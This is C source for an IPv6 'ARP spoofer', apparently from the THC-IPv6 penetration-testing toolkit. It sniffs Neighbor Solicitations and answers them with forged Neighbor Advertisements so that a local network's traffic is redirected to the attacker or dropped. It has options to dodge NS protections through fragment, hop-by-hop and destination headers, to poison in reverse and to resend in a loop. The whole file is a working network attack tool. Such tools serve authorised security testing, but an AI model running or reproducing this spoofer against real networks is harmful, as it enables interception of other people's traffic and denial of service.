#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <pcap.h>
#include "thc-ipv6.h"

unsigned char *pkt = NULL, *pkt2 = NULL;
int            pkt_len = 0, pkt2_len = 0;
thc_ipv6_hdr * ipv6, *ipv62;
int mychecksum, do_loop = 0, pp[65536], pp_cnt = 0, do_hop = 0, do_frag = 0,
                do_dst = 0, do_reverse = 0, cnt, ptype = NXT_ICMP6;
char *        interface;
char *        ptr1, *ptr2, *ptr3, *ptr4;
thc_ipv6_hdr *hdr;

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-lRFHD] interface [fake-mac]\n\n", prg);
  printf(
      "This is an \"ARP spoofer\" for IPv6, redirecting all local traffic to "
      "your own\n");
  printf(
      "system (or nirvana if fake-mac does not exist) by answering falsely "
      "to\n");
  printf("Neighbor Solitication requests\n");
  printf(
      "Option -l loops and resends the packets per target every 5 seconds.\n");
  printf(
      "Option -R will also try to inject the destination of the "
      "solicitation\n");
  printf(
      "NS security bypass: -F fragment, -H hop-by-hop and -D large destination "
      "header\n");
  exit(-1);
}

void kill_children(int signo) {
  int i;

  for (i = 0; i <= pp_cnt; i++)
    if (pp[i] > 0 && pp[i] < 65536) kill(pp[i], SIGKILL);

  exit(0);
}

void intercept(u_char *foo, const struct pcap_pkthdr *header,
               const unsigned char *data) {
  unsigned char *ipv6hdr = (unsigned char *)(data + 14);

  if (debug) {
    printf("DEBUG: packet received\n");
    thc_dump_data((unsigned char *)data, header->caplen, "Received Packet");
  }
  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_NEIGHBORSOL ||
      header->caplen < 78)
    return;
  if (*(data + 22) + *(data + 23) + *(data + 24) + *(data + 25) + *(data + 34) +
          *(data + 35) + *(data + 36) + *(data + 37) ==
      0)
    return;
  if (debug) printf("DEBUG: packet is a valid icmp6 neighbor solitication\n");

  memcpy(ipv6->pkt, data + 6, 6);         // copy srcmac to dstmac
  memcpy(ipv6->pkt + 38, data + 22, 16);  // copy srcip6 to dstip6
  memcpy(ipv6->pkt + 22, data + 62, 16);  // copy target to srcip6
  memcpy(ipv6->pkt + 62 + (do_dst * 1400) + (do_hop + do_frag) * 8, data + 62,
         16);  // copy target to target
  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
  mychecksum = checksum_pseudo_header(
      ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6,
      ipv6->pkt + 54 + (do_dst * 1400) + (do_hop + do_frag) * 8, 32);
  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum / 256;
  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum % 256;
  if (do_dst)
    thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38, ptype,
                          ipv6->pkt + 40 + 14, ipv6->pkt_len - 40 - 14, 1240);
  else
    thc_send_pkt(interface, pkt, &pkt_len);

  ptr2 = thc_ipv62notation(ipv6->pkt + 38);
  ptr4 = thc_ipv62notation(ipv6->pkt + 22);
  printf("Spoofed packet to %s as %s\n", ptr2, ptr4);
  free(ptr2);
  free(ptr4);

  ipv6->pkt[pkt_len - 28] = 0xa0;  // reset SOL flag, ROUTER+OVERRIDE only
  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
  mychecksum = checksum_pseudo_header(
      ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6,
      ipv6->pkt + 54 + (do_dst * 1400) + (do_hop + do_frag) * 8, 32);
  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum / 256;
  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum % 256;
  if (do_dst)
    thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38, ptype,
                          ipv6->pkt + 40 + 14, ipv6->pkt_len - 40 - 14, 1240);
  else
    thc_send_pkt(interface, pkt, &pkt_len);

  if (do_reverse) {
    memcpy(ipv62->pkt, data + 74, 4);  // create the multicast mac for the dst
                                       // so we dont need to do a NS :-)
    memcpy(ipv62->pkt + 38, data + 62, 16);  // copy target do dst6
    memcpy(ipv62->pkt + 22, data + 22, 16);  // copy source to source
    memcpy(ipv62->pkt + 62 + (do_dst * 1400) + (do_hop + do_frag) * 8,
           data + 22, 16);  // copy source to target
    ipv62->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
    ipv62->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
    mychecksum = checksum_pseudo_header(
        ipv62->pkt + 22, ipv62->pkt + 38, NXT_ICMP6,
        ipv62->pkt + 54 + (do_dst * 1400) + (do_hop + do_frag) * 8, 32);
    ipv62->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] =
        mychecksum / 256;
    ipv62->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] =
        mychecksum % 256;
    if (do_dst)
      thc_send_as_fragment6(interface, ipv62->pkt + 22, ipv62->pkt + 38, ptype,
                            ipv62->pkt + 40 + 14, ipv62->pkt_len - 40 - 14,
                            1240);
    else
      thc_send_pkt(interface, pkt2, &pkt2_len);
    ptr2 = thc_ipv62notation(ipv62->pkt + 38);
    ptr4 = thc_ipv62notation(ipv62->pkt + 22);
    printf("Spoofed packet to %s as %s\n", ptr2, ptr4);
    free(ptr2);
    free(ptr4);
  }

  if ((pp[pp_cnt] = fork()) == 0) {
    usleep(200);
    debug = 0;
    if (do_dst) {
      thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38, ptype,
                            ipv6->pkt + 40 + 14, ipv6->pkt_len - 40 - 14, 1240);
      thc_send_as_fragment6(interface, ipv62->pkt + 22, ipv62->pkt + 38, ptype,
                            ipv62->pkt + 40 + 14, ipv62->pkt_len - 40 - 14,
                            1240);
    } else {
      thc_send_pkt(interface, pkt, &pkt_len);
      if (do_reverse) thc_send_pkt(interface, pkt2, &pkt2_len);
    }
    sleep(1);

    if (do_loop == 1) {
      signal(SIGTERM, exit);
      signal(SIGSEGV, exit);
      signal(SIGHUP, exit);
      signal(SIGINT, exit);
      while (1) {
        sleep(5);
        if (do_dst) {
          thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38,
                                ptype, ipv6->pkt + 40 + 14,
                                ipv6->pkt_len - 40 - 14, 1240);
          thc_send_as_fragment6(interface, ipv62->pkt + 22, ipv62->pkt + 38,
                                ptype, ipv62->pkt + 40 + 14,
                                ipv62->pkt_len - 40 - 14, 1240);
        } else {
          thc_send_pkt(interface, pkt, &pkt_len);
          if (do_reverse) thc_send_pkt(interface, pkt2, &pkt2_len);
        }
      }
    }
    exit(0);
  } else if (do_loop == 1 && pp[pp_cnt] != -1) {
    if (pp_cnt < 65534)
      pp_cnt++;
    else
      do_loop = 2;
  }

  ipv6->pkt[56] = 0;
  ipv6->pkt[57] = 0;
  ipv6->pkt[pkt_len - 28] = 0xe0;  // set SOL flag again
  (void)wait3(NULL, WNOHANG, NULL);
  return;
}

int main(int argc, char *argv[]) {
  char           dummy[24], mac[16] = "", buf2[6], buf3[1398];
  unsigned char *ownmac = mac;
  int            i, j;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL)
    printf("WARNING: %s is not working with injection!\n", argv[0]);

  if (debug) printf("Preparing spoofed packet for speed-up\n");

  while ((i = getopt(argc, argv, "FHDRl")) >= 0) {
    switch (i) {
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      case 'R':
        do_reverse = 1;
        break;
      case 'l':
        do_loop = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 1) help(argv[0]);
  interface = argv[optind];
  if (argc - optind == 2 && argv[optind + 1] != NULL)
    sscanf(argv[optind + 1], "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    ownmac = thc_get_own_mac(interface);
  if (thc_get_own_ipv6(interface, NULL, PREFER_LINK) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  memset(dummy, 'X', sizeof(dummy));
  dummy[16] = 2;
  dummy[17] = 1;
  memcpy(&dummy[18], ownmac, 6);
  memset(buf2, 0, sizeof(buf2));
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  for (i = 0; i <= 0 + do_reverse; i++) {
    //    printf("i: %d\n", i);
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, dummy,
                                        dummy, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_hop) {
      ptype = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (ptype == NXT_ICMP6) ptype = NXT_FRAG;
      for (j = 0; j < do_frag; j++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return -1;
    }
    if (do_dst) {
      if (ptype == NXT_ICMP6) ptype = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
    }
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0,
                      ICMP6_NEIGHBORADV_SOLICIT | ICMP6_NEIGHBORADV_OVERRIDE |
                          ICMP6_NEIGHBORADV_ROUTER,
                      dummy, 24, 0) < 0)
      return -1;
    if (thc_generate_pkt(interface, ownmac, dummy, pkt, &pkt_len) < 0)
      return -1;
    ipv6 = (thc_ipv6_hdr *)pkt;
    memset(ipv6->pkt + 56 + (do_dst * 1400) + (do_hop + do_frag) * 8, 0,
           2);  // reset checksum to zero
    if (debug) {
      thc_dump_data(ipv6->pkt, ipv6->pkt_len, "Prepared spoofing packet");
      printf("\n");
    }
    //    printf("i: %d, do_reverse: %d\n", i, do_reverse);
    if (i == 0 && do_reverse) {
      //      printf("ipv62->ipv6 %p\n", ipv6);
      ipv62 = ipv6;
      ipv62->pkt[0] = 0x33;  // multicast mac hack for destination
      ipv62->pkt[1] = 0x33;  // multicast mac hack for destination
      ipv6 = NULL;
      pkt2 = pkt;
      pkt = NULL;
      pkt2_len = pkt_len;
      pkt_len = 0;
      ipv62->pkt[pkt2_len - 28] = 0xa0;  // reset SOL flag, ROUTER+OVERRIDE only
    }
  }

  signal(SIGTERM, kill_children);
  signal(SIGSEGV, kill_children);
  signal(SIGHUP, kill_children);
  signal(SIGINT, kill_children);
  memset((char *)pp, 0, sizeof(pp));

  printf("Remember to enable routing, you will denial service otherwise:\n");
  printf(" =>  echo 1 > /proc/sys/net/ipv6/conf/all/forwarding\n");
  printf("Remember to prevent sending out ICMPv6 Redirect packets:\n");
  printf(" =>  ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP\n");
  printf(
      "Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to "
      "end) ...\n");
  return thc_pcap_function(interface, "icmp6", (char *)intercept, 1, NULL);
}
